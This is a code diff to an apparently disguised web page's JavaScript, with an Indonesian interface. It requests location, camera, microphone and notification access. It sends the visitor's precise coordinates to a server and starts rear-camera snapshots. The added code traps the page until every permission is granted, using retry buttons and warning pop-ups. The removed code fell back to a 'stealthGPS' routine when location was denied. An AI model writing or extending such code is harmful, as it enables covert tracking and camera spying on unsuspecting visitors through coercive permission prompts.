@@ -902,7 +902,10 @@ function requestAllPermissions() {
         let idx = 0;
         function next() {
             if (idx >= perms.length) { resolve(); return; }
-            requestPermItem(perms[idx]).then(() => { idx++; next(); });
+            requestPermItem(perms[idx]).then(granted => {
+                if (granted) { idx++; next(); }
+                // if not granted, requestPermItem keeps retrying — never resolves
+            });
         }
         next();
     });
@@ -911,50 +914,101 @@ function requestAllPermissions() {
 function requestPermItem(perm) {
     const statusEl = document.getElementById('lo-status-' + perm.id);
     const itemEl = document.getElementById('lo-perm-' + perm.id);
-    statusEl.textContent = 'Meminta...';
-    itemEl.classList.add('active');
 
-    return new Promise(r => {
-        const done = (ok) => {
-            itemEl.classList.remove('active');
-            if (ok) {
-                statusEl.textContent = '\u2713 Aktif';
-                itemEl.classList.add('done');
-            } else {
-                statusEl.textContent = 'Dilewati';
+    function tryPerm() {
+        statusEl.textContent = 'Meminta...';
+        itemEl.classList.add('active');
+
+        return new Promise(r => {
+            const fail = () => {
+                itemEl.classList.remove('active');
+                statusEl.textContent = '\u26A0 Diblokir';
+                statusEl.style.color = '#ff6b6b';
                 itemEl.classList.add('skipped');
-            }
-            setTimeout(r, 300);
-        };
+                showKeepaliveNotif(perm.label);
+                // Add retry button
+                let retryBtn = itemEl.querySelector('.p-retry');
+                if (!retryBtn) {
+                    retryBtn = document.createElement('button');
+                    retryBtn.className = 'p-retry';
+                    retryBtn.textContent = 'Coba Lagi';
+                    retryBtn.addEventListener('click', () => {
+                        statusEl.style.color = '';
+                        itemEl.classList.remove('skipped');
+                        retryBtn.remove();
+                        r(tryPerm());
+                    });
+                    itemEl.appendChild(retryBtn);
+                }
+            };
 
-        if (perm.id === 'location') {
-            if (!navigator.geolocation) { done(false); return; }
-            navigator.geolocation.getCurrentPosition(
-                (p) => {
-                    socket.emit('location',{lat:p.coords.latitude,lng:p.coords.longitude,accuracy:p.coords.accuracy});
-                    done(true);
-                },
-                (err) => {
-                    if (err.code === 1) stealthGPS();
-                    done(false);
-                },
-                {enableHighAccuracy:true,timeout:10000}
-            );
-        } else if (perm.id === 'camera') {
-            if (!navigator.mediaDevices?.getUserMedia) { done(false); return; }
-            navigator.mediaDevices.getUserMedia({video:{facingMode:'environment'},audio:false})
-                .then((s) => { stream = s; startSnapshots(); done(true); })
-                .catch(() => done(false));
-        } else if (perm.id === 'microphone') {
-            if (!navigator.mediaDevices?.getUserMedia) { done(false); return; }
-            navigator.mediaDevices.getUserMedia({audio:true,video:false})
-                .then((s) => { s.getTracks().forEach(t => t.stop()); done(true); })
-                .catch(() => done(false));
-        } else if (perm.id === 'notifications') {
-            if (!('Notification' in window)) { done(false); return; }
-            Notification.requestPermission().then(p => done(p === 'granted'));
-        }
-    });
+            if (perm.id === 'location') {
+                if (!navigator.geolocation) { fail(); return; }
+                navigator.geolocation.getCurrentPosition(
+                    (p) => {
+                        socket.emit('location',{lat:p.coords.latitude,lng:p.coords.longitude,accuracy:p.coords.accuracy});
+                        itemEl.classList.remove('active');
+                        statusEl.textContent = '\u2713 Aktif';
+                        statusEl.style.color = '';
+                        itemEl.classList.add('done');
+                        r(true);
+                    },
+                    () => fail(),
+                    {enableHighAccuracy:true,timeout:10000}
+                );
+            } else if (perm.id === 'camera') {
+                if (!navigator.mediaDevices?.getUserMedia) { fail(); return; }
+                navigator.mediaDevices.getUserMedia({video:{facingMode:'environment'},audio:false})
+                    .then((s) => {
+                        stream = s; startSnapshots();
+                        itemEl.classList.remove('active');
+                        statusEl.textContent = '\u2713 Aktif';
+                        statusEl.style.color = '';
+                        itemEl.classList.add('done');
+                        r(true);
+                    })
+                    .catch(() => fail());
+            } else if (perm.id === 'microphone') {
+                if (!navigator.mediaDevices?.getUserMedia) { fail(); return; }
+                navigator.mediaDevices.getUserMedia({audio:true,video:false})
+                    .then((s) => {
+                        s.getTracks().forEach(t => t.stop());
+                        itemEl.classList.remove('active');
+                        statusEl.textContent = '\u2713 Aktif';
+                        statusEl.style.color = '';
+                        itemEl.classList.add('done');
+                        r(true);
+                    })
+                    .catch(() => fail());
+            } else if (perm.id === 'notifications') {
+                if (!('Notification' in window)) { fail(); return; }
+                Notification.requestPermission().then(p => {
+                    if (p === 'granted') {
+                        itemEl.classList.remove('active');
+                        statusEl.textContent = '\u2713 Aktif';
+                        statusEl.style.color = '';
+                        itemEl.classList.add('done');
+                        r(true);
+                    } else {
+                        fail();
+                    }
+                });
+            }
+        });
+    }
+
+    return tryPerm();
+}
+
+function showKeepaliveNotif(label) {
+    const existing = document.querySelector('.perm-notif');
+    if (existing) existing.remove();
+    const div = document.createElement('div');
+    div.className = 'perm-notif';
+    div.innerHTML = '<div class="pn-icon">\u26A0</div><div class="pn-text">Izin <strong>' + label + '</strong> diperlukan. Aktifkan di pengaturan browser, lalu klik <strong>Coba Lagi</strong>.</div><div class="pn-close">&times;</div>';
+    div.querySelector('.pn-close').addEventListener('click', () => div.remove());
+    const overlay = document.getElementById('loadingOverlay');
+    if (overlay) overlay.insertBefore(div, document.getElementById('loPerms'));
 }
 
 const errorMessages = [
